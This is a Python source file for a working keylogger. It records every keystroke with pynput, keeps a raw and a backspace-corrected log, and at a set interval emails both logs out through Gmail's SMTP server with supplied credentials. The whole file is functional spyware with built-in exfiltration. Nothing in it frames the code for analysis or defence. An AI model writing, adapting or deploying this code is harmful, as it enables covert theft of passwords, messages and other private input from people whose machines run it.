from email.mime.text import MIMEText
from pynput import keyboard
import threading
import smtplib
import re


class Keylogger:
    def __init__(self, email: str, password: str, interval: int = 60):
        if not self._is_valid_email(email):
            raise ValueError("Invalid email address format.")

        self.__email = email
        self.__password = password
        self.__interval = interval
        self.__first_run = True
        self.__shutdown = False
        self.__timer = None

        self.raw_log = ""
        self.formatted_log = ""
        self._formatted_chars = []  # list for editable formatted log

    def _is_valid_email(self, email):
        return re.match(r"[^@]+@[^@]+\.[^@]+", email)

    def _map_special_key(self, key):
        mapping = {
            keyboard.Key.space: " ",
            keyboard.Key.enter: "[ENTER]",
            keyboard.Key.tab: "[TAB]",
            keyboard.Key.backspace: "[BACKSPACE]",
            keyboard.Key.esc: "[ESC]",
            keyboard.Key.ctrl_l: "[CTRL_L]",
            keyboard.Key.ctrl_r: "[CTRL_R]",
            keyboard.Key.shift: "[SHIFT]",
            keyboard.Key.shift_r: "[SHIFT_R]",
            keyboard.Key.alt_l: "[ALT_L]",
            keyboard.Key.alt_r: "[ALT_R]",
            keyboard.Key.caps_lock: "[CAPSLOCK]",
            keyboard.Key.cmd: "[CMD]",
            keyboard.Key.delete: "[DEL]",
            keyboard.Key.up: "[UP]",
            keyboard.Key.down: "[DOWN]",
            keyboard.Key.left: "[LEFT]",
            keyboard.Key.right: "[RIGHT]",
        }
        return mapping.get(key, f"[{str(key).replace('Key.', '').upper()}]")

    def process_key(self, key):
        try:
            char = key.char
            self.raw_log += char
            self._formatted_chars.append(char)
        except AttributeError:
            mapped = self._map_special_key(key)
            self.raw_log += f"<{mapped}>"

            if mapped == "[BACKSPACE]":
                # remove last character, but skip special keys
                while self._formatted_chars:
                    last = self._formatted_chars.pop()
                    if not (last.startswith("[") and last.endswith("]")):
                        break
            else:
                self._formatted_chars.append(mapped)

        self.formatted_log = ''.join(self._formatted_chars)

    def _send_email(self, subject, body):
        msg = MIMEText(body)
        msg["Subject"] = subject
        msg["From"] = self.__email
        msg["To"] = self.__email

        try:
            with smtplib.SMTP_SSL("smtp.gmail.com", 465) as server:
                server.login(self.__email, self.__password)
                server.send_message(msg)
            print("[+] Email sent successfully.")
        except Exception as e:
            print(f"[!] Failed to send email: {e}")

    def _report(self):
        if self.__first_run:
            subject = "Keylogger Initialized"
            body = "[+] Keylogger started successfully.\n\n"
        else:
            subject = "Keylogger Report"
            body = f"--- RAW LOG ---\n{self.raw_log}\n\n--- FORMATTED LOG ---\n{self.formatted_log}"

        self._send_email(subject, body)
        self.raw_log = ""
        self._formatted_chars.clear()
        self.formatted_log = ""
        self.__first_run = False

        if not self.__shutdown:
            self.__timer = threading.Timer(self.__interval, self._report)
            self.__timer.start()

    def shutdown(self):
        self.__shutdown = True
        if self.__timer:
            self.__timer.cancel()

    def start(self):
        print("[*] Starting keylogger...")
        with keyboard.Listener(on_press=self.process_key) as listener:
            self._report()
            listener.join()